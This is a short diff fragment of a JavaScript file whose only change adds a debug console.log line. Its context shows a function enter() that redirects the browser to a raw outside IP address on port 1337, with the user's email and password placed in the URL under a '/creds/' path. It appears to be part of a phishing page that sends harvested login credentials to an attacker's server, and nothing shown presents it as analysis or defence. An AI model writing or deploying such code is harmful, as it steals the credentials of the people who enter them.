@@ -6,3 +6,5 @@ function enter() {
 
     window.location.href = `http://178.198.77.93:1337/creds/${mail}/${password}`
 }
+
+console.log("Yeeah 2")
